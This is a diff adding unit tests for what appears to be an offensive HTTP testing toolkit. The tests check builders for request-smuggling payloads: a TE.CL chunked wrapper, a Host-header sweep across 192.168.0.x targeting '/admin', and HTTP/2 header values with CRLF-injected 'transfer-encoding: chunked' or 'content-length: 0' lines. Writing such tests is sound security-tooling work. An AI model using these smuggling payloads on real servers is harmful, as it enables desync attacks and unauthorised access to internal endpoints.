@@ -109,3 +109,55 @@ class WrapTeclTest(unittest.TestCase):
         raw = wrap_tecl("t.example", "GET /x HTTP/1.1\r\nContent-Length: 5\r\n\r\ny=")
         self.assertTrue(raw.endswith("\r\n0\r\n\r\n"))
         self.assertIn("Transfer-Encoding: chunked", raw)
+
+
+class HostSweepTest(unittest.TestCase):
+
+    def test_range_count_and_ips(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_host_sweep
+        rows = build_host_sweep("lab.example", start=1, end=255)
+        self.assertEqual(len(rows), 255)
+        self.assertEqual(rows[0][0], "192.168.0.1")
+        self.assertEqual(rows[-1][0], "192.168.0.255")
+
+    def test_raw_carries_divergent_host_and_path(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_host_sweep
+        rows = build_host_sweep("lab.example", path="/admin", start=42, end=42)
+        ip, raw = rows[0]
+        self.assertEqual(ip, "192.168.0.42")
+        self.assertIn("GET /admin HTTP/1.1\r\n", raw)
+        self.assertIn("Host: 192.168.0.42\r\n", raw)
+        self.assertTrue(raw.endswith("\r\n\r\n"))
+
+    def test_custom_base_and_extra_headers(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_host_sweep
+        rows = build_host_sweep("lab", base="10.0.0", start=5, end=6,
+                                extra_headers={"X-Trace": "1"})
+        self.assertEqual([r[0] for r in rows], ["10.0.0.5", "10.0.0.6"])
+        self.assertIn("X-Trace: 1\r\n", rows[0][1])
+
+
+class H2CrlfSmuggleTest(unittest.TestCase):
+
+    def test_carrier_value_embeds_crlf_injected_header(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_h2_crlf_smuggle
+        out = build_h2_crlf_smuggle("h.example", "0\r\n\r\nPOST / HTTP/1.1\r\n")
+        self.assertEqual(out["carrier_value"], "bar\r\ntransfer-encoding: chunked")
+        # the carrier header is a single h2 header whose value carries the CRLF
+        carriers = [v for (k, v) in out["headers"] if k == "foo"]
+        self.assertEqual(carriers, ["bar\r\ntransfer-encoding: chunked"])
+
+    def test_pseudo_headers_and_body_present(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_h2_crlf_smuggle
+        out = build_h2_crlf_smuggle("h.example", "BODYBYTES", path="/x", method="POST")
+        hd = dict(out["headers"])
+        self.assertEqual(hd[":method"], "POST")
+        self.assertEqual(hd[":path"], "/x")
+        self.assertEqual(hd[":authority"], "h.example")
+        self.assertEqual(out["body"], "BODYBYTES")
+
+    def test_custom_carrier_and_injection(self):
+        from praetor.tools.testing_extended._smuggle_capture import build_h2_crlf_smuggle
+        out = build_h2_crlf_smuggle("h", "b", carrier="x-pad", inject="content-length: 0")
+        self.assertEqual(out["carrier_value"], "bar\r\ncontent-length: 0")
+        self.assertIn(("x-pad", "bar\r\ncontent-length: 0"), out["headers"])
